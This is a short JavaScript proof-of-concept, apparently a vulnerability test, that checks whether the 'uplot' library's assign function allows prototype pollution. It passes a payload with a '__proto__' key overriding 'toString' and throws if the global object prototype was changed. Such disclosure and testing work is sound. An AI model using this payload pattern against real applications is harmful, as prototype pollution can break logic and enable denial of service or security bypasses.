var Uplot = require("uplot");

let payload = { ["__proto__"]: { "toString": "polluted" } };

Uplot.assign({}, payload);

if (({}).toString == "polluted")
  throw Error("I pollute");
